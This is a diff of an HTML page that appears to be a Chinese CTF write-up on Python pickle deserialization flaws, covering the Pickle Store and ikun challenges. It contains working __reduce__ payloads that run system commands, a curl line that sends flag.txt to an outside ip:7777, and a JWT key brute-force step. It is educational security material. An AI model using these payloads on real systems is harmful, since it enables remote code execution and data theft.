     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><ul>
+</h2><ul>
 <li>pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如：</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### linux(注意posix):</span>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># linux(注意posix):</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6be9d">b</span><span style="color:#a6be9d">&#39;cposix</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">system</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">p0</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">(Vwhoami</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">p1</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">tp2</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">Rp3</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">.&#39;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### windows(注意nt):</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># windows(注意nt):</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6be9d">b</span><span style="color:#a6be9d">&#39;cnt</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">system</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">p0</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">(Vwhoami</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">p1</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">tp2</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">Rp3</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">.&#39;</span></span></span></code></pre></div><ul>
 <li>其他模块的load也可以触发pickle反序列化漏洞。例如：numpy.load()先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此numpy.load()也可以触发pickle反序列化漏洞。</li>
 </ul>
-<h5 id="题目" class="heading-element"><span>0.0.0.6  题目</span>
+<h1 id="题目" class="heading-element"><span>题目</span>
   <a href="#%e9%a2%98%e7%9b%ae" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="watevrctf-2019pickle-store" class="heading-element"><span>0.0.0.6.1  [watevrCTF-2019]Pickle Store</span>
+</h1><h2 id="watevrctf-2019pickle-store" class="heading-element"><span>[watevrCTF-2019]Pickle Store</span>
   <a href="#watevrctf-2019pickle-store" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>把这个session先base64解码再反序列化</p>
+</h2><p>把这个session先base64解码再反序列化</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231528624.png" alt="image-20230323152826601" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231528624.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231528624.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231528624.png?size=large 2x" data-title="image-20230323152826601" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">base64</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">pickle</span>
@@ -855,11 +876,11 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#ff636f">def</span> <span style="color:#58a1dd">__reduce__</span>(<span style="color:#58a1dd">self</span>):
 </span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> (<span style="color:#58a1dd">eval</span>,(<span style="color:#a6be9d">&#34;__import__(&#39;os&#39;).system(&#39;curl -d @flag.txt  ip:7777&#39;)&#34;</span>,))
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">a</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">payload</span>()
-</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">base64</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">b64encode</span>(<span style="color:#58a1dd">pickle</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dumps</span>(<span style="color:#58a1dd">a</span>)))</span></span></code></pre></div><h6 id="ciscn2019-华北赛区-day1-web2ikun" class="heading-element"><span>0.0.0.6.2  [CISCN2019 华北赛区 Day1 Web2]ikun</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">base64</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">b64encode</span>(<span style="color:#58a1dd">pickle</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dumps</span>(<span style="color:#58a1dd">a</span>)))</span></span></code></pre></div><h2 id="ciscn2019-华北赛区-day1-web2ikun" class="heading-element"><span>[CISCN2019 华北赛区 Day1 Web2]ikun</span>
   <a href="#ciscn2019-%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba-day1-web2ikun" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>注册，抓包，发现jwt</p>
+</h2><p>注册，抓包，发现jwt</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231537190.png" alt="image-20230323153752096" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231537190.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231537190.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231537190.png?size=large 2x" data-title="image-20230323153752096" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231537573.png" alt="image-20230323153743480" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231537573.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231537573.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231537573.png?size=large 2x" data-title="image-20230323153743480" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>爆破密钥得到1Kun,改成admin</p>
@@ -886,16 +907,16 @@
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">payload</span>(<span style="color:#58a1dd">object</span>):
 </span></span><span style="display:flex;"><span>    <span style="color:#ff636f">def</span> <span style="color:#58a1dd">__reduce__</span>(<span style="color:#58a1dd">self</span>):
 </span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> (<span style="color:#58a1dd">commands</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">getoutput</span>,(<span style="color:#a6be9d">&#39;ls /&#39;</span>,))
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####return (commands.getoutput,(&#39;cat /flag.txt&#39;,))</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#828b96;font-style:italic">#return (commands.getoutput,(&#39;cat /flag.txt&#39;,))</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">a</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">payload</span>()
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span> <span style="color:#58a1dd">urllib</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">quote</span>(<span style="color:#58a1dd">pickle</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dumps</span>(<span style="color:#58a1dd">a</span>))</span></span></code></pre></div><p>payload：ccommands%0Agetoutput%0Ap0%0A%28S%27cat%20/flag.txt%27%0Ap1%0Atp2%0ARp3%0A.</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231610305.png" alt="image-20230323161059163" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231610305.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231610305.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231610305.png?size=large 2x" data-title="image-20230323161059163" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h5 id="文章" class="heading-element"><span>0.0.0.7  文章</span>
+<h1 id="文章" class="heading-element"><span>文章</span>
   <a href="#%e6%96%87%e7%ab%a0" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p><a href="https://goodapple.top/archives/1069"target="_blank" rel="external nofollow noopener noreferrer">https://goodapple.top/archives/1069</a></p>
+</h1><p><a href="https://goodapple.top/archives/1069"target="_blank" rel="external nofollow noopener noreferrer">https://goodapple.top/archives/1069</a></p>
 <p><a href="https://xz.aliyun.com/t/7436"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/7436</a></p></div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
